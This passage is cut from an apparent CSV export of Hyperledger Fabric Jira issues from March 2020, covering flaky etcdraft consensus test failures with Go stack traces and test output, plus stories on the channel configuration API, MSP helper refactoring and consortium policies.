2020-03-24T20:15:01.5656718Z testing.(*T).Parallel(0xc0000d0400)
2020-03-24T20:15:01.5657057Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/testing/testing.go:814 +0x3b7
2020-03-24T20:15:01.5657521Z github.com/hyperledger/fabric/orderer/consensus/etcdraft.TestPeriodicCheck(0xc0000d0400)
2020-03-24T20:15:01.5658046Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/eviction_test.go:29 +0x54
2020-03-24T20:15:01.5658474Z testing.tRunner(0xc0000d0400, 0x14730b8)
2020-03-24T20:15:01.5658947Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/testing/testing.go:909 +0x19a
2020-03-24T20:15:01.5659269Z created by testing.(*T).Run

2020-03-24T20:15:01.5659863Z 
2020-03-24T20:15:01.5660075Z goroutine 92 [sync.Cond.Wait, 19 minutes]:
2020-03-24T20:15:01.5660334Z runtime.goparkunlock(...)
2020-03-24T20:15:01.5660656Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/runtime/proc.go:310
2020-03-24T20:15:01.5661019Z sync.runtime_notifyListWait(0xc00298fc90, 0xc000000000)
2020-03-24T20:15:01.5661392Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/runtime/sema.go:510 +0xf8
2020-03-24T20:15:01.5661741Z sync.(*Cond).Wait(0xc00298fc80)
2020-03-24T20:15:01.5662059Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/sync/cond.go:56 +0x8e
2020-03-24T20:15:01.5662594Z github.com/hyperledger/fabric/vendor/code.cloudfoundry.org/clock/fakeclock.(*FakeClock).increment(0xc00039bec0, 0x3b9aca00, 0xc0004a1901, 0x2)
2020-03-24T20:15:01.5663274Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/code.cloudfoundry.org/clock/fakeclock/fake_clock.go:96 +0xca
2020-03-24T20:15:01.5663890Z github.com/hyperledger/fabric/vendor/code.cloudfoundry.org/clock/fakeclock.(*FakeClock).WaitForNWatchersAndIncrement(...)
2020-03-24T20:15:01.5664491Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/code.cloudfoundry.org/clock/fakeclock/fake_clock.go:56
2020-03-24T20:15:01.5665035Z github.com/hyperledger/fabric/orderer/consensus/etcdraft_test.glob..func1.3.3()
2020-03-24T20:15:01.5665614Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1387 +0x8e8
2020-03-24T20:15:01.5666276Z github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/leafnodes.(*runner).runSync(0xc000227380, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, ...)
2020-03-24T20:15:01.5666990Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/leafnodes/runner.go:113 +0xe0
2020-03-24T20:15:01.5667677Z github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/leafnodes.(*runner).run(0xc000227380, 0x3, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, ...)
2020-03-24T20:15:01.5668386Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/leafnodes/runner.go:64 +0x108
2020-03-24T20:15:01.5669077Z github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/leafnodes.(*ItNode).Run(0xc0002283c0, 0x15e9500, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, ...)
2020-03-24T20:15:01.5670461Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/leafnodes/it_node.go:26 +0x88
2020-03-24T20:15:01.5671141Z github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/spec.(*Spec).runSample(0xc000156d20, 0x0, 0x15e9500, 0xc000266740)
2020-03-24T20:15:01.5671772Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/spec/spec.go:215 +0x6e2
2020-03-24T20:15:01.5672429Z github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/spec.(*Spec).Run(0xc000156d20, 0x15e9500, 0xc000266740)
2020-03-24T20:15:01.5673048Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/spec/spec.go:138 +0x168
2020-03-24T20:15:01.5673671Z github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/specrunner.(*SpecRunner).runSpec(0xc0000ddcc0, 0xc000156d20, 0x0)
2020-03-24T20:15:01.5674349Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/specrunner/spec_runner.go:200 +0x173
2020-03-24T20:15:01.5674981Z github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/specrunner.(*SpecRunner).runSpecs(0xc0000ddcc0, 0x1)
2020-03-24T20:15:01.5675626Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/specrunner/spec_runner.go:170 +0x217
2020-03-24T20:15:01.5676247Z github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/specrunner.(*SpecRunner).Run(0xc0000ddcc0, 0x8)
2020-03-24T20:15:01.5676986Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/specrunner/spec_runner.go:66 +0x141
2020-03-24T20:15:01.5677796Z github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/suite.(*Suite).Run(0xc00024e500, 0x7fac4d069cd8, 0xc000145d00, 0x142ff85, 0xe, 0xc0001b9200, 0x1, 0x1, 0x1608ae0, 0xc000266740, ...)
2020-03-24T20:15:01.5678558Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/internal/suite/suite.go:62 +0x6a0
2020-03-24T20:15:01.5679239Z github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo.RunSpecsWithCustomReporters(0x15ea3c0, 0xc000145d00, 0x142ff85, 0xe, 0xc000069ed8, 0x1, 0x1, 0x20)
2020-03-24T20:15:01.5679921Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/ginkgo_dsl.go:221 +0x339
2020-03-24T20:15:01.5680496Z github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo.RunSpecs(0x15ea3c0, 0xc000145d00, 0x142ff85, 0xe, 0x0)
2020-03-24T20:15:01.5681096Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/vendor/github.com/onsi/ginkgo/ginkgo_dsl.go:202 +0x9a
2020-03-24T20:15:01.5681617Z github.com/hyperledger/fabric/orderer/consensus/etcdraft_test.TestEtcdraft(0xc000145d00)
2020-03-24T20:15:01.5682153Z 	/home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/etcdraft_suite_test.go:20 +0x122
2020-03-24T20:15:01.5682617Z testing.tRunner(0xc000145d00, 0x1473160)
2020-03-24T20:15:01.5683036Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/testing/testing.go:909 +0x19a
2020-03-24T20:15:01.5683359Z created by testing.(*T).Run
2020-03-24T20:15:01.5683707Z 	/opt/hostedtoolcache/go/1.13.8/x64/src/testing/testing.go:960 +0x652
{code}

https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/10527/logs/70",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Mar/20 5:26 AM;sykesm;70.txt;https://jira.hyperledger.org/secure/attachment/18184/70.txt",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a8j:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Mar/20 5:34 AM;sykesm;The test that hung up appears to be

{code}
		It(""can remove leader by reconfiguring cluster"", func() {
			network.elect(1)

			// trigger status dissemination
			Eventually(func() int {
				c1.clock.Increment(interval)
				return c2.fakeFields.fakeActiveNodes.SetCallCount()
			}, LongEventualTimeout).Should(Equal(2))
			Expect(c2.fakeFields.fakeActiveNodes.SetArgsForCall(1)).To(Equal(float64(2)))

			By(""Configuring cluster to remove node"")
			Expect(c1.Configure(configEnv, 0)).To(Succeed())
			Eventually(c2.support.WriteConfigBlockCallCount, LongEventualTimeout).Should(Equal(1))
			c1.clock.WaitForNWatchersAndIncrement(ELECTION_TICK*interval, 2)
{code}

Looks like the clock never had 2 watchers so it was never incremented.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
echo Generating channel configuration transaction 'channel.tx',FAB-17656,44651,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,kgeonw,kgeonw,kgeonw,25/Mar/20 5:43 PM,28/Mar/20 6:39 AM,28/Oct/23 3:09 AM,28/Mar/20 6:39 AM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"echo Generating channel configuration transaction 'channel.tx'

it will be output to the console ""configtxgen -profile TwoOrgsChannel -outputCreateChannelTx ./channel-artifacts/channel.tx -channelID mychannel""",,kgeonw,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a8z:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),kgeonw,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update node fabric-sample applications/smart contracts to use events,FAB-17657,44652,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,heatherp,heatherp,25/Mar/20 8:36 PM,25/Mar/20 8:36 PM,28/Oct/23 3:09 AM,,v2.0.0,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"We've cleaned up the apis for listening for events in the 2.0.0-beta.4 release of fabric-network, which will be available in a 2.x release some time soon.

There's no example in fabric-samples of a smart contract emitting an event in a transaction and an application listening for it, and pulling out useful information from a block/transaction/contract event. This would provide a good example to point users at and display best practices for listening for events. 

I'm unclear whether this should be a specific event-type sample, or whether we should update the current samples, or perhaps just update one transaction in fabcar/commercial paper to do this.

Should also be considered for java, and go, once the programming model work has been delivered into the go-sdk",,heatherp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Yes,Unset,,,,,No,,Unset,No,,,"1|i01a97:",,,,No,Unset,,(Please add steps to reproduce),,Yes,,,,,,Unset,,Unset,,(Please add usage information),heatherp,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Split config package example usage into smaller chunks,FAB-17658,44653,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,caod,caod,25/Mar/20 11:12 PM,30/Mar/20 11:33 PM,28/Oct/23 3:09 AM,30/Mar/20 11:33 PM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to see smaller and more varied example usages for updating the config instead of one giant end to end flow that updates every field.

 

*Acceptance*

For now let's split out separate update examples dealing specifically with
 * updating orderer configuration (including orderer policies)
 * updating application specific values (including application policies)
 * organization management (adding/removing orgs and anchor peers/orderer endpoints to application orgs and orderer orgs respectively)
 * msp modifications
 * capabilities (application, orderer, and channel)",,caod,tsharris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjzi",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,tsharris,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Mar/20 9:59 PM;tsharris;[https://github.com/hyperledger/fabric/pull/944];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Consolidate/rework MSP-related functions,FAB-17659,44654,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,25/Mar/20 11:26 PM,31/Mar/20 5:16 AM,28/Oct/23 3:09 AM,31/Mar/20 5:16 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"Now that we have an UpdateMSP function which allows directly modifying various fields of an MSP we should use that where possible instead of relying on highly specific, single use helper functions (such as AddRootCAToMSP and RevokeCertificateFromMSP). We should streamline things and rename functions as appropriate. 

I'll update this with more concrete details shortly. 

Rename:
* GetMSPConfigurationFor(Application,Orderer,Consortium)Org to (Application,Orderer,Consortium)MSP

Remove / refactor
* AddRootCAToMSP - likely remove this. any value to a separate function for this when we can just append directly to the fields using UpdateMSP now?
* RevokeCertificateFromMSP - consider separate helper for creating CRL given a SigningIdentity and then we can just use UpdateMSP to add the new CRL",,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17694,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjz9",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),wlahti,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"31/Mar/20 12:47 AM;wlahti;https://github.com/hyperledger/fabric/pull/948;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement helper function to retrieve channel configuration from a config transaction,FAB-17660,44655,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,caod,caod,25/Mar/20 11:29 PM,03/Apr/20 11:37 PM,28/Oct/23 3:09 AM,03/Apr/20 11:37 PM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a user of the Fabric channel configuration API, I would like to be able to retrieve the entire channel configuration without manually parsing the config transaction. Now that we have the supporting functions in place for retrieving all dependent fields, we should be able to support retrieval of the entire channel configuration.

 

*Acceptance*

I should be able to call a function for retrieving channel configuration that returns a config.Channel.",,caod,dereckluo,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17638,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjzr",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,dereckluo,xwu,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Mar/20 10:13 PM;xwu;[~caod]
The type of the return value seems to be config.Channel, which is defined in file config.go.
In addition, we can get policies for consortiums, ordere and application by functions, should we open a new Story to get the channel's policies?
;;;","26/Mar/20 11:09 PM;caod;[~xwu] yes there will be one for channel policies as well. I'm adding a couple more stories to the backlog today.;;;","26/Mar/20 11:45 PM;caod;Updated the story to fix the typo and opened FAB-17664. Thanks [~xwu] for pointing that out!;;;","01/Apr/20 12:08 AM;dereckluo;https://github.com/hyperledger/fabric/pull/962;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Intermittent UT failure in consensus/etcdraft: Chain 3-node Raft cluster when reconfiguring raft cluster reconfiguration [It] rotates leader certificate and triggers leadership transfer,FAB-17661,44656,,Bug,In Progress,FAB,Fabric,software,denyeart,,,Medium,,guoger,sykesm,sykesm,25/Mar/20 11:56 PM,11/Jun/20 3:25 PM,28/Oct/23 3:09 AM,,,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ci-flake,,,,,"https://dev.azure.com/Hyperledger/0227bd2c-c4f6-478f-be00-ee519f115180/_apis/build/builds/10563/logs/62

{code}
2020-03-25T12:41:52.3464940Z ------------------------------
2020-03-25T12:41:52.3465378Z • Failure [10.779 seconds]
2020-03-25T12:41:52.3465581Z Chain
2020-03-25T12:41:52.3466121Z /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:78
2020-03-25T12:41:52.3466636Z   3-node Raft cluster
2020-03-25T12:41:52.3467224Z   /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1453
2020-03-25T12:41:52.3467609Z     when reconfiguring raft cluster
2020-03-25T12:41:52.3468358Z     /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1603
2020-03-25T12:41:52.3468714Z       reconfiguration
2020-03-25T12:41:52.3469318Z       /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1712
2020-03-25T12:41:52.3470013Z         rotates leader certificate and triggers leadership transfer [It]
2020-03-25T12:41:52.3470722Z         /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1753
2020-03-25T12:41:52.3471039Z 
2020-03-25T12:41:52.3471395Z         Timed out after 10.000s.
2020-03-25T12:41:52.3471612Z         Expected
2020-03-25T12:41:52.3471804Z             <int>: 1
2020-03-25T12:41:52.3472008Z         to equal
2020-03-25T12:41:52.3472355Z             <int>: 2
2020-03-25T12:41:52.3472514Z 
2020-03-25T12:41:52.3472828Z         /home/vsts/work/1/go/src/github.com/hyperledger/fabric/orderer/consensus/etcdraft/chain_test.go:1790
{code}",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"25/Mar/20 11:55 PM;sykesm;62.txt;https://jira.hyperledger.org/secure/attachment/18195/62.txt",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01a9f:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove Get Prefix on Accessors for ConfigTx functions,FAB-17662,44661,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,tsharris,tsharris,26/Mar/20 10:58 PM,04/Apr/20 2:18 AM,28/Oct/23 3:09 AM,04/Apr/20 2:18 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"[https://golang.org/doc/effective_go.html#Getters]

 

func (c *ConfigTx) GetAnchorPeers(...) -> func (c *ConfigTx) AnchorPeers(...)

 

[https://github.com/hyperledger/fabric/pull/880#discussion_r397418783]",,MHBauer,tsharris,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzp9",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),MHBauer,tsharris,wlahti,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Mar/20 11:03 PM;wlahti;Note: my current work to refactor/rename MSP-related functions handles this for the ConfigTX MSP getters, so be aware that those should be ignored if my PR hasn't been merged by the time this task is started.;;;","03/Apr/20 3:03 AM;tsharris;[https://github.com/hyperledger/fabric/pull/978];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function to update a consortium group's channel creation policy value,FAB-17663,44662,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,xwu,caod,caod,26/Mar/20 11:30 PM,30/Mar/20 10:22 PM,28/Oct/23 3:09 AM,30/Mar/20 10:22 PM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API, I would like to be able to update the channel creation policy value in a consortium.

We don't support configuring it at channel creation time because it governs the validation of the channel creation request so allowing the channel create tx to set the value would defeat the point; however, we want to be able to allow consumers to update this value on config updates. Note that this is not a ConfigPolicy but rather a ConfigValue in a specific consortium group.

 

*Acceptance*

I can call the function to update the default channel creation policy value in an existing config. An example should be added to the example_test as well.",,caod,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjzu",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,xwu,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Mar/20 10:22 PM;xwu;https://github.com/hyperledger/fabric/pull/929;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement functions for retrieving and updating a channel group's policies,FAB-17664,44663,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,caod,caod,26/Mar/20 11:33 PM,30/Mar/20 9:44 AM,28/Oct/23 3:09 AM,30/Mar/20 9:44 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"As a consumer of the fabric config API, I would like to be able to retrieve and update my channel's policies. 

We initially supported adding/removing/retrieving policies for all other groups except for the channel group, lets add this in now before we support retrieving the entire channel config.

 

*Acceptance*

I can call a function to add a policy to the channel group and another to remove a policy from the channel group. I should also be able to retrieve the existing policies in the channel group. The examples should be updated to demonstrate usage of these features.",,caod,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjzk",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Consortium groups don't have policies,FAB-17665,44665,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,xwu,caod,caod,26/Mar/20 11:40 PM,04/Apr/20 12:05 AM,28/Oct/23 3:09 AM,04/Apr/20 12:05 AM,,,,,,,,,,,,,,,,,,,,,,,0,ipm,,,,,"We added a helper function to support retrieving policies for a consortium, but they don't actually have policies. We should go ahead and remove any functions around retrieving policies from a consortium. Likewise the consortiums group also does not support adding/removing policies and only contains a single hardcoded AcceptAll signature policy. It's probably ok to support retrieving the policy for consortiums group since that doesn't hurt, but it would always be the same hardcoded value so maybe consider just removing it. Luckily we didn't add any functions for adding/removing policies from a consortium or consortiums group so we don't need to do anything there.",,caod,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjzs",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,xwu,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Mar/20 11:19 PM;xwu;As a specific consortium does not have policies, and the Consortiums group or a specific org has a hardcoded policy, retrieving the policies is meaningless.
Therefore, the function GetPoliciesForConsortium, GetPoliciesForConsortiums, and GetPoliciesForConsortiumOrg can be removed.

Is my understanding wrong? If it is correct, I can fix this issue.
;;;","30/Mar/20 11:13 PM;caod;The first two functions can be removed for the reasons you mentioned. GetPoliciesForConsortiumOrg probably still should exist since policies are added to the consortium org. There is a consideration that maybe we should still support retrieving the consortium hardcoded policy since maybe in the future we might support updating it, but for now it's probably unnecessary and can be removed.;;;","31/Mar/20 10:55 PM;caod;[https://github.com/hyperledger/fabric/pull/958];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add upgrade from 1.4 to 2.0 to 2.1 script,FAB-17666,44667,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,suryalnvs,suryalnvs,suryalnvs,27/Mar/20 12:07 AM,27/Mar/20 6:14 PM,28/Oct/23 3:09 AM,27/Mar/20 6:14 PM,v2.1.0,,,,,,,,,v2.1.0,,,,fabric-quality,,,,,,,,,0,quality,,,,,Add upgrade from 1.4 to 2.0 to 2.1 script,,suryalnvs,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00uze:rzczqzxyzzx8zws",,,,Unset,Unset,In Progress,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage 